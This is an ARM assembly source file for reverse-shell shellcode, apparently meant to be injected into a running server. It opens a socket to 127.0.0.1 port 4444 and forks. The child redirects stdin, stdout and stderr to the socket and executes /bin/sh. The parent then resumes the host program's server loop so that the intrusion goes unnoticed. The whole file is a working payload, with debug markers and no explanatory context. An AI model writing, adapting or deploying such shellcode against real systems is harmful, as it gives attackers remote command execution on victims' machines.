@ revshell_cont.s - DEBUG VERSION (all adr â†’ ldr)
.syntax unified
.arch armv6
.arm

.text
.global shellcode_start
.global shellcode_end

.extern server_loop
.extern request_ready
.extern total_connections

shellcode_start:
    push    {r0-r12, lr}

    @ Marker: 'S'
    mov     r0, #1
    ldr     r1, =marker_S
    mov     r2, #1
    mov     r7, #4
    svc     #0

    @ ===== Create socket =====
    mov     r0, #2
    mov     r1, #1
    mov     r2, #0
    ldr     r7, =281
    svc     #0
    mov     r5, r0

    @ Marker: 'K'
    mov     r0, #1
    ldr     r1, =marker_K
    mov     r2, #1
    mov     r7, #4
    svc     #0

    @ ===== Build sockaddr_in =====
    sub     sp, sp, #16

    @ sin_family = 2
    mov     r0, #2
    strb    r0, [sp, #0]
    mov     r0, #0
    strb    r0, [sp, #1]

    @ sin_port = 4444 (0x115C big-endian)
    mov     r0, #0x11
    strb    r0, [sp, #2]
    mov     r0, #0x5C
    strb    r0, [sp, #3]

    @ sin_addr = 127.0.0.1 (7F 00 00 01 big-endian)
    mov     r0, #0x7F
    strb    r0, [sp, #4]
    mov     r0, #0x00
    strb    r0, [sp, #5]
    mov     r0, #0x00
    strb    r0, [sp, #6]
    mov     r0, #0x01
    strb    r0, [sp, #7]

    @ sin_zero = 8 bytes zero
    mov     r0, #0
    str     r0, [sp, #8]
    str     r0, [sp, #12]

    @ ===== Connect =====
    mov     r0, r5
    mov     r1, sp
    mov     r2, #16
    ldr     r7, =283
    svc     #0
    mov     r6, r0

    @ Marker: 'C'
    mov     r0, #1
    ldr     r1, =marker_C
    mov     r2, #1
    mov     r7, #4
    svc     #0

    cmp     r6, #0
    bne     cleanup_fail

    @ Marker: 'F'
    mov     r0, #1
    ldr     r1, =marker_F
    mov     r2, #1
    mov     r7, #4
    svc     #0

    @ ===== Fork =====
    mov     r7, #2
    svc     #0
    cmp     r0, #0
    beq     child_shell

    @ ===== Parent: wait =====
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    ldr     r7, =114
    svc     #0

    mov     r0, r5
    mov     r7, #6
    svc     #0

    b       cleanup

child_shell:
    @ Marker: 'c'
    mov     r0, #1
    ldr     r1, =marker_c
    mov     r2, #1
    mov     r7, #4
    svc     #0

    @ ===== dup2 loop =====
    mov     r4, #0
dup2_loop:
    mov     r0, r5
    mov     r1, r4
    ldr     r7, =63
    svc     #0
    add     r4, r4, #1
    cmp     r4, #3
    blt     dup2_loop

    @ Marker: 'D'
    mov     r0, #1
    ldr     r1, =marker_D
    mov     r2, #1
    mov     r7, #4
    svc     #0

    @ ===== execve("/bin/sh") =====
    ldr     r0, =shell_str
    mov     r1, #0
    mov     r2, #0
    ldr     r7, =11
    svc     #0

    mov     r0, #1
    mov     r7, #1
    svc     #0

cleanup_fail:
    @ Marker: 'X'
    mov     r0, #1
    ldr     r1, =marker_X
    mov     r2, #1
    mov     r7, #4
    svc     #0

cleanup:
    ldr     r1, =request_ready
    mov     r0, #0
    str     r0, [r1]

    ldr     r1, =total_connections
    mov     r0, #0
    str     r0, [r1]

    pop     {r0-r12, lr}
    mov     r0, #3
    ldr     r12, =server_loop
    bx      r12

@ ===== Data =====
.align 2

marker_S: .byte 'S'
marker_K: .byte 'K'
marker_C: .byte 'C'
marker_F: .byte 'F'
marker_c: .byte 'c'
marker_D: .byte 'D'
marker_X: .byte 'X'

shell_str:
    .asciz "/bin/sh"
    .align 2

shellcode_end: